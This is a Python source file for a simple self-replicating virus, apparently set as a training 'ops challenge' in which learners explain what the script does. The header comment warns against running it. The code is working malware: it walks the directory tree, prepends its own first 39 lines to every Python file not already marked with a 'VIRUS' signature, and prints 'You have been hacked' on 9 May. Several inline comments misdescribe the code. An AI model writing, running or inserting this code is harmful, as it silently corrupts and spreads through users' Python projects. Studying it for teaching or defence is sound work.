#!/usr/bin/python

#Do not run this code the point of this ops Challenges is to explain what the script is doing here this is a malware script

#import os allows us to run terminal commands - these commands are not in python
import os
import datetime
#variable
SIGNATURE = "VIRUS"
#defines location
def locate(path):
    #targets all files bc array is empty
    files_targeted = []
    #searches the os and uses listdir as the path
    filelist = os.listdir(path)
    #for loop for every file we can find
    for fname in filelist:
        #variables are in blue
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        #confirming it is a python file
        elif fname[-3:] == ".py":
            infected = False
            #opens the file
            #"/" accepts all files
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                #adding to the file
                files_targeted.append(path+"/"+fname)
    return files_targeted


def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()